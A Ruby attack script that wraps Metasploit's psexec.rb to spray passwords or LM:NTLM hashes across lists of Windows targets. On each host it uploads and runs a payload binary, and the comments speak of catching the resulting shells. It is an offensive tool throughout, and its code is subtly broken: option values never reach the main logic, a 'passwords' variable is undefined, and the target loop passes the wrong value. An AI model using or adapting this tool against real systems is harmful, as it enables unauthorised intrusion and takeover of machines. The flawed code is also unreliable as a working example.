#!/usr/bin/env ruby
#
# MSF PSEXEC.rb Wrapper so we can run it against multiple targtes in a systematic manner
# The standalone PSEXEC runs an upload & exec payload on targets credentials work for
# so make sure you have your muli handler setup as a job and to not exit after session
# so you can catch as many shells as we pop and send its way :)
#
# See Here for help with password hash formats MSF accepts:
# http://www.offensive-security.com/metasploit-unleashed/PSExec_Pass_The_Hash
#
# Nothing new here, just a nice wrapper for standalone psexec.rb to squeeze some extra mileage out :)
# By: Hood3dRob1n
#
# EX: mpx.rb -u Administrator -p 'P@$$w0rd!123' -T /root/Desktop/targets.lst -x /root/fun/payloads/evil.exe
# EX: mpx.rb -u Administrator -p 'e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c' -T /root/Desktop/targets.lst -x /root/fun/payloads/evil.exe
# EX: mpx.rb -u IUSR_WIN2003WEB -P /root/fun/passwords/winpass.lst -t 10.10.40.60 -x /root/fun/payloads/evil.exe
#

############### EDIT HERE ###############
MSF='/usr/shares/metasploit-framework/' #
############# NO MORE EDITS #############

require 'optparse'

################ FUNCTION DECLARATIONS ##################
#Trap interupts so we exit cleanly, don't freak out......
trap("SIGINT") { puts "\n\nWARNING! CTRL+C Detected, shutting scanner down now....."; exit; }

#banner
def banner
	puts
	puts "OWS: Multi-Scan PSEXEC Wrapper"
	puts "By: Hood3dRob1n"
end

#clear terminal
def cls 
	system('clear') # posix style clear
end

#Run a single instance of the ruby psexec.rb tool as it was intended to be run
#Pass it a username, password or hash, a IP for target and the path to the evil.exe payload to use
def single_target(user, pass, target, evil)
	puts "Running psexec #{user} #{pass} #{target} #{evil}....."
	if @home == @tools
		system("psexec.rb #{user} #{pass} #{target} #{evil}")
	else
		Dir.chdir("#{MSF}tools/") {
			system("psexec.rb #{user} #{pass} #{target} #{evil}")
		}
	end
end

################## MAIN ####################
options = {}
# Parse the Arguments Passed for run
optparse = OptionParser.new do |opts| 
	opts.banner = "Usage:#{$0} [OPTION]" 
	opts.separator ""
	opts.separator "EX: #{$0} [user] [pass|hash|list] [target|list] [payload.exe]"
	opts.separator ""
	opts.separator "Options: "
	#Now setup and layout Options....
	opts.on('-u', '--username <user>', "\n\tUsername to use for authentication") do |username|
		username = username.chomp
	end
	opts.on('-p', '--password <pass>', "\n\tSingle Password or LM:NTLM Hash set to use for Authentication") do |password|
		options[:pmethod] = 1 #Single Password Authentication Attack
		password = password.chomp
	end
	opts.on('-P', '--passlist </path/to/list>', "\n\tList with one Password or LM:NTLM Hash per Line") do |pfile|
		options[:pmethod] = 2 #Multi-Pass Authentication Attack
		if File.exists?(pfile)
			options[:pmethod] = 2 #Multi-Pass Authentication Attack
			password = File.open(pfile).readlines
		else
			puts
			puts "Can't find provided Password file!"
			puts "Please check permissions or path and try again....."
			puts
			puts opts #print opts outlined above for help
			puts
			exit 666; # :)
		end
	end
	opts.on('-t', '--target <IP>', "\n\tSingle Target IP") do |target|
		options[:tmethod] = 1 #Single Target to Attack
		target = target.chomp
	end
	opts.on('-T', '--targets <path/to/list>', "\n\tList with one Target per line") do |tfile|
		if File.exists?(tfile)
			options[:tmethod] = 2 #Multiple Targets to Attack
			target = File.open(tfile).readlines
		else
			puts
			puts "Can't find provided Targets file!"
			puts "Please check permissions or path and try again....."
			puts
			puts opts #print opts outlined above for help
			puts
			exit 666; # :)
		end
	end
	opts.on('-x', '--exploit <path/to/evil.exe>', "\n\tPath to Binary Payload to run on success") do |evilbin|
		if File.exists?(evilbin)
			payload = evilbin
		else
			puts
			puts "Can't find provided Payload binary file!"
			puts "Please check permissions or path and try again....."
			puts
			puts opts #print opts outlined above for help
			puts
			exit 666; # :)
		end
	end
	#Establish help menu		
	opts.on('-h', '--help', "\n\tHelp Menu") do 
		cls
		banner
		puts
		puts opts #print opts outlined above for help
		puts
		exit 69; # :)
	end
end
begin
	foo = ARGV[0] || ARGV[0] = "-h"
	optparse.parse!
	mandatory = [:pmethod, :tmethod]
	missing = mandatory.select{ |param| options[param].nil? }
	if not missing.empty?
		puts "Missing or Unknown Options: "
		puts optparse
		exit 666;
	end
rescue OptionParser::InvalidOption, OptionParser::MissingArgument
	cls
	puts $!.to_s
	puts
	puts optparse
	puts
	exit 666;
end
@home=Dir.pwd
@tools="#{MSF}tools/"
#Try user/pass target combos...
if options[:tmethod].to_i == 1
	#Single Target to Attack
	if options[:pmethod].to_i == 1
		#Single Target, Single Pass
		single_target(username, password, target, payload)
	elsif options[:pmethod].to_i == 2
		passwords.each do |pass|
			#Single Target, Multi Pass
			single_target(username, pass, target, payload)
		end
	end
elsif options[:tmethod].to_i == 2
	#Multiple Targets to Attack
	target.each do |targ|
		if options[:pmethod].to_i == 1
			#Mult Target, Single Pass
			single_target(username, password, target, payload)
		elsif options[:pmethod].to_i == 2
			#Mult Target, Multi Pass
			passwords.each do |pass|
				single_target(username, pass, target, payload)
			end
		end
	end
end
#EOF
